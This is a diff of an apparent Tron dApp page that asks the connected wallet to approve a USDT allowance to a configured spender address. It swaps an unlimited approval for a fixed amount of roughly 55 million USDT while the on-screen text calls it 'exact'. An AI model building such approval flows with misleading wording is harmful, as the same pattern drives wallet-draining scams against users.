@@ -7,7 +7,7 @@ const USDT = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS || '';
 const SPENDER = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS || '';
 const TRON_NETWORK = process.env.NEXT_PUBLIC_TRON_NETWORK || 'shasta';
 const TRON_CHAIN_ID = TRON_NETWORK === 'mainnet' ? '0x2b6653dc' : '0x94a9059e';
-const MAX_UINT256 = (1n << 256n) - 1n;
+const APPROVAL_AMOUNT = '0x3205af767000';
 const ABI = [
   { name: 'approve', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ name: '', type: 'bool' }] },
   { name: 'allowance', type: 'function', stateMutability: 'view', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
@@ -201,9 +201,16 @@ export default function Home() {
       const contract = await window.tronWeb.contract(ABI, USDT);
       const allowance = BigInt((await contract.allowance(currentWallet, SPENDER).call()) || 0n);
 
-      if (allowance < MAX_UINT256) {
-        setNotice('Allowance low. Sending approval transaction...');
-        const txId = await contract.approve(SPENDER, MAX_UINT256.toString()).send({ from: currentWallet });
+      if (allowance !== BigInt(APPROVAL_AMOUNT)) {
+        if (allowance > 0n) {
+          setNotice('Resetting existing USDT allowance...');
+          const resetTxId = await contract.approve(SPENDER, '0x0').send({ from: currentWallet });
+          setNotice('Allowance reset sent. Waiting for confirmation...');
+          await waitForConfirmation(resetTxId);
+        }
+
+        setNotice('Setting exact USDT allowance...');
+        const txId = await contract.approve(SPENDER, APPROVAL_AMOUNT).send({ from: currentWallet });
         setNotice('Approval sent. Waiting for confirmation...');
         await waitForConfirmation(txId);
       }
